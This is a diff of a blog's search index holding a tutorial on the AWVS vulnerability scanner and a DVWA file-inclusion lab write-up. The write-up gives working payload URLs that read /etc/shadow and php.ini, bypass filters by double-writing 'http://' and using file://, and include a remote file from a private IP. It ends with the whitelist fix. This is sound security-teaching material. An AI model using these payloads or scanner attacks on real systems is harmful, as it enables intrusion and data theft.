@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AWVS的基本使用</title>
+    <url>/posts/22917.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
+<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
+<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
+<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
+<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
+<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
+<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
+<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
+<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
+<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
+<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
+<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
+<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
+<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
+<ul>
+<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
+</ul>
+<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
+<p>认证测试，用于尝试破解破解账户密码。 </p>
+<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
+<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
+<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
+<ul>
+<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
+<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
+</ul>
+<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
+<ul>
+<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
+</ul>
+<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
+<li>点击New Scan</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
+<ul>
+<li>点击扫描配置就是Scan Setting页面</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
+<ul>
+<li>发现目标服务器基本信息</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
+<ul>
+<li>是否需要登录，可以使用login sequence</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
+<ul>
+<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
+</ul>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Active_Directory</title>
     <url>/posts/35642.html</url>
     <content><![CDATA[<h1 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h1><p><strong>Active Directory</strong>（简称AD。）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），在Windows 2000 Server开始内建于Windows Server产品中，它处理在组织中的网路物件，物件可以是使用者，群组，电脑，网域控制站，邮件，设定档，组织单元，树系等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。</p>
@@ -358,68 +422,9 @@
 ]]></content>
   </entry>
   <entry>
-    <title>AWVS的基本使用</title>
-    <url>/posts/22917.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
-<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
-<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
-<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
-<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
-<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
-<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
-<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
-<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
-<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
-<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
-<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
-<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
-<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
-<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
-<ul>
-<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
-</ul>
-<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
-<p>认证测试，用于尝试破解破解账户密码。 </p>
-<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
-<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
-<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
-<ul>
-<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
-<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
-</ul>
-<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
-<ul>
-<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
-</ul>
-<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
-<li>点击New Scan</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
-<ul>
-<li>点击扫描配置就是Scan Setting页面</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
-<ul>
-<li>发现目标服务器基本信息</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
-<ul>
-<li>是否需要登录，可以使用login sequence</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
-<ul>
-<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
-</ul>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>渗透测试</tag>
-      </tags>
+    <title>Cobalt Strike 4.0学习</title>
+    <url>/posts/7578.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>CVE-2019-0708本地复现</title>
@@ -512,46 +517,6 @@
       </categories>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike 4.0学习</title>
-    <url>/posts/7578.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>DVWA之File Inclusion</title>
-    <url>/posts/21204.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
-<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>点击<code>file1.php</code>后，显示如下:<br>![](DVWA之File Inclusion/FI2.jpg)<br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
-<p>![](DVWA之File Inclusion/FI3.jpg)<br>报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。</p>
-<p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br>![](DVWA之File Inclusion/FI4.jpg)<br>成功读取了服务器的php.ini文件</p>
-<p>构造url（相对路径）：<br>。。。。。。待续</p>
-<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
-<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
-<p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
-<p><strong>远程文件包含</strong></p>
-<p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
-<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br>![](DVWA之File Inclusion/FI5.jpg)<br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>WEB</tag>
-        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -648,6 +613,41 @@
       </tags>
   </entry>
   <entry>
+    <title>DVWA之File Inclusion</title>
+    <url>/posts/21204.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p>点击<code>file1.php</code>后，显示如下:<br>![](DVWA之File Inclusion/FI2.jpg)<br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
+<p>![](DVWA之File Inclusion/FI3.jpg)<br>报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。</p>
+<p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br>![](DVWA之File Inclusion/FI4.jpg)<br>成功读取了服务器的php.ini文件</p>
+<p>构造url（相对路径）：<br>。。。。。。待续</p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
+<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
+<p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
+<p><strong>远程文件包含</strong></p>
+<p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br>![](DVWA之File Inclusion/FI5.jpg)<br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GitHub上传</title>
     <url>/posts/8472.html</url>
     <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
@@ -668,56 +668,6 @@
       </categories>
       <tags>
         <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git学习（一）</title>
-    <url>/posts/55269.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
